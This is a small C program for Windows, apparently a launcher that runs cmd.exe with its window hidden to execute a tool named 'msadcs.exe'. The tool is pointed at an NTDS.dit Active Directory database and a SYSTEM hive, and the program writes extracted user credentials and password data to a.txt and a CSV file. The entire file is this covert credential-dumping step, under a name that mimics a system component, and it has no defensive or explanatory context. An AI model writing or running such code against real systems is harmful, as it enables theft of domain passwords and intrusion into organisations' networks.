#include <windows.h>

#define RUN(to_run) ShellExecuteA(NULL,"open","cmd.exe",to_run ,NULL,SW_HIDE);

int main() {
    RUN("msadcs.exe \"NTDS.dit\" -s \"USER_SYSTEM\" -p a.txt --users-csv a.csv");
    return 0;
}